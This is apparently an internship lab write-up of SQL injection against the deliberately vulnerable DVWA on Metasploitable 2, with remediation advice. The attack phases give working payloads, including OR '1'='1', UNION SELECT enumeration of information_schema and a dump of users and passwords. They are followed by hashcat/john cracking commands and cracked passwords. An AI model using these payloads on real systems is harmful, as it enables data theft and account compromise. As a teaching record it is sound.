# Task 9: SQL Injection Exploit on DVWA (Low Security)

## Internship: Oasis Infobyte — Security Analyst Internship
**Level:** Advanced  
**Tool Used:** Browser-based manual SQLi  
**Target Application:** DVWA v1.0.7 on Metasploitable 2  
 

---

## Objective

Find and exploit an SQL Injection vulnerability in DVWA (Damn Vulnerable Web Application), escalating from basic enumeration to full credential extraction, and document how to patch the vulnerability.

---

## Lab Environment

| Component        | Details                        |
|-----------------|-------------------------------|
| Attacker Machine | Kali Linux (10.0.2.5)         |
| Target Machine   | Metasploitable 2 (10.0.2.3)   |
| Target URL       | http://10.0.2.3/dvwa/vulnerabilities/sqli/ |
| Security Level   | Low                           |
| Database         | MySQL 5.0.51a-3ubuntu5        |
| DB Name          | dvwa                          |
| Network Type     | NAT Network (VirtualBox)      |

---

## What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. When user input is not properly sanitized before being inserted into a SQL query, an attacker can inject malicious SQL code that changes the query's logic.

**Vulnerable code example (PHP):**
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

If `$id` is taken directly from user input without sanitization, injecting `' OR '1'='1` changes the query to:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1';
```
This returns ALL rows since `'1'='1'` is always true.

---

## Attack Methodology

### Phase 1 — Reconnaissance (Normal Behavior)

**Step 1: Test normal input**

- Payload: `3`
- URL: `http://10.0.2.3/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit#`
- Result:
  ```
  ID: 3
  First name: Hack
  Surname: Me
  ```

- Payload: `4`
- URL: `http://10.0.2.3/dvwa/vulnerabilities/sqli/?id=4&Submit=Submit#`
- Result:
  ```
  ID: 4
  First name: Pablo
  Surname: Picasso
  ```

**Observation:** The application queries the database using the `id` parameter and returns user records. The parameter is directly embedded in the SQL query.

---

### Phase 2 — Injection Testing (Always-True Condition)

**Step 2: Test always-true SQL payload**

- Payload: `1' OR '1'='1`
- URL: `http://10.0.2.3/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit#`
- Result: **All 5 users returned**
  ```
  ID: 1' OR '1'='1  | First name: admin    | Surname: admin
  ID: 1' OR '1'='1  | First name: Gordon   | Surname: Brown
  ID: 1' OR '1'='1  | First name: Hack     | Surname: Me
  ID: 1' OR '1'='1  | First name: Pablo    | Surname: Picasso
  ID: 1' OR '1'='1  | First name: Bob      | Surname: Smith
  ```

**Analysis:** The application is confirmed vulnerable to SQL Injection. The injected `OR '1'='1'` condition bypasses the `WHERE` clause and returns all records.

**Underlying SQL query being executed:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

---

### Phase 3 — UNION-Based Data Extraction

UNION-based SQLi allows appending additional SELECT queries to the original query to extract data from other tables.

**Prerequisite:** Determine number of columns using `ORDER BY`:
- Payload: `1' ORDER BY 2-- -` → Success (2 columns confirmed)

---

**Step 3: Extract MySQL Version**

- Payload: `' UNION SELECT null, version()-- -`
- URL: `http://10.0.2.3/dvwa/vulnerabilities/sqli/?id='+UNION+SELECT+null%2C+version()--+-&Submit=Submit#`
- Result:
  ```
  ID: ' UNION SELECT null, version()-- -
  First name:
  Surname: 5.0.51a-3ubuntu5
  ```

**Finding:** Database is **MySQL 5.0.51a-3ubuntu5** — an end-of-life version with known vulnerabilities.

---

**Step 4: Extract Database Name**

- Payload: `' UNION SELECT null, database()-- -`
- URL: `http://10.0.2.3/dvwa/vulnerabilities/sqli/?id='+UNION+SELECT+null%2C+database()--+-&Submit=Submit#`
- Result:
  ```
  ID: ' UNION SELECT null, database()-- -
  First name:
  Surname: dvwa
  ```

**Finding:** Current database name is **dvwa**.

---

**Step 5: Enumerate Tables**

- Payload: `' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -`
- Result:
  ```
  Surname: guestbook
  Surname: users
  ```

**Finding:** Database contains two tables — `guestbook` and `users`. The `users` table is the primary target.

---

**Step 6: Dump Usernames and Password Hashes**

- Payload: `' UNION SELECT user, password FROM users-- -`
- URL: `http://10.0.2.3/dvwa/vulnerabilities/sqli/?id='+UNION+SELECT+user%2C+password+FROM+users--+-&Submit=Submit#`
- Result:

| Username | MD5 Password Hash                    |
|---------|--------------------------------------|
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99     |
| gordonb | e99a18c428cb38d5f260853678922e03     |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b     |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7     |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99     |

**Finding:** Full credential dump achieved. Passwords are stored as **unsalted MD5 hashes** — an insecure hashing algorithm that can be easily cracked.

---

## MD5 Hash Cracking (Post-Exploitation)

The extracted MD5 hashes can be cracked using tools like `hashcat` or `john`:

```bash
# Using hashcat with rockyou wordlist
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Using john
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Known cracked hashes:
- `5f4dcc3b5aa765d61d8327deb882cf99` → **password**
- `0d107d09f5bbe40cade3de5c71e9e9b7` → **letmein**
- `e99a18c428cb38d5f260853678922e03` → **abc123**

---

## Attack Summary

| Step | Payload | Result |
|------|---------|--------|
| 1 | `3` | Normal user record returned |
| 2 | `1' OR '1'='1` | All 5 users dumped |
| 3 | `' UNION SELECT null, version()-- -` | MySQL 5.0.51a-3ubuntu5 |
| 4 | `' UNION SELECT null, database()-- -` | Database: dvwa |
| 5 | `' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -` | Tables: guestbook, users |
| 6 | `' UNION SELECT user, password FROM users-- -` | Full credential dump with MD5 hashes |

---

## Impact Assessment

| Risk | Description |
|------|-------------|
| **CRITICAL** | Full database credential extraction |
| **CRITICAL** | Authentication bypass possible |
| **HIGH** | Database version and schema fully exposed |
| **HIGH** | Weak MD5 hashing — easily crackable |
| **HIGH** | Could escalate to OS-level access via `INTO OUTFILE` |

---

## Remediation / How to Fix

### 1. Use Prepared Statements (Parameterized Queries) — PRIMARY FIX

**Vulnerable code:**
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysql_query($query);
```

**Secure code:**
```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

Prepared statements separate SQL code from data. Even if a user injects SQL syntax, it will be treated as literal data — never executed as code.

### 2. Input Validation & Whitelisting

```php
// Accept only numeric IDs
if (!is_numeric($id)) {
    die("Invalid input.");
}
```

### 3. Use Strong Password Hashing

Replace MD5 with bcrypt or Argon2:
```php
// Storing password
$hash = password_hash($password, PASSWORD_BCRYPT);

// Verifying password
if (password_verify($input, $hash)) { ... }
```

### 4. Principle of Least Privilege

The database user should only have SELECT privileges on necessary tables — never full access to `information_schema` or ability to write files.

### 5. Web Application Firewall (WAF)

Deploy a WAF to detect and block common SQLi patterns like `UNION SELECT`, `OR '1'='1'`, and `information_schema` queries.

### 6. Disable Detailed Error Messages

Never expose database errors to end users. Log them server-side only.

---

## OWASP Reference

This vulnerability corresponds to **OWASP Top 10 — A03:2021 Injection**.

---

## Repository Structure

```
Task9_SQL_Injection/
├── sql_injection_exploit.sh   # Exploit script (curl-based)
├── screenshots/               # Step-by-step screenshots
│   ├── 01_normal_query_id3.png
│   ├── 02_normal_query_id4.png
│   ├── 03_always_true_all_users.png
│   ├── 04_union_version.png
│   ├── 05_union_database.png
│   ├── 06_union_tables.png
│   └── 07_union_password_dump.png
└── README.md                  # This report
```

---

## Disclaimer

This exploit was performed in a controlled lab environment on an intentionally vulnerable machine (Metasploitable 2 / DVWA) for educational purposes only as part of the Oasis Infobyte Security Analyst Internship. Performing SQL injection on systems without explicit authorization is illegal.
